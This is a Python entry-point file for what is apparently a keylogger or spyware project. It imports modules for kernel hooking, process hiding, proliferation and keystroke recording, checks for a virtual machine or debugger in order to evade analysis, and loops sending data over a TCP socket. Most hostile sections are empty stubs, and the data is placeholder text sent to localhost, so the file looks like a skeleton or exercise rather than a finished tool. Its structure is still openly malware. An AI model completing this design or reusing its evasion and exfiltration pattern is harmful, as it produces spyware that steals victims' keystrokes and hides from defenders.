import socket

from sys import stdout

from HideProcess import HideProcess
from HookKernel import HookKernel
from Proliferate import Proliferate
from RecordKeys import RecordKeys
from RunningEnvironment import RunningEnvironment
from SendKeys import SendKeys
from WasteTime import WasteTime

def main():
    ################################################################
    # Check if program is running in a virtual machine or a debugger
    ################################################################
    runEnv = RunningEnvironment()
    runEnv.checkVM()
    runEnv.checkDebugger()

    if runEnv.isCompromised:
        # Perform useless operations
        WasteTime.run()

    ################################################################
    # HookKernel
    ################################################################


    ################################################################
    # HideProcess
    ################################################################


    ################################################################
    # Proliferate
    ################################################################


    while True:
        ################################################################
        # RecordKeys
        ################################################################
        data = "FAKE DATA"

        ################################################################
        # Start Client
        ################################################################
        HOST, PORT = "localhost", 9999
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            # Connect to server and send data
            sock.connect((HOST, PORT))
            sock.sendall(bytes(data + "\n", "utf-8"))

            # Receive data from the server and shut down
            received = str(sock.recv(1024), "utf-8")

            stdout.write(f'DATA :_> {data}\n')
            stdout.write(f'FROM {HOST}:{PORT}:_> {received}\n')

        ################################################################
        # SendKeys
        ################################################################


    return

if __name__ == "__main__":
    main()
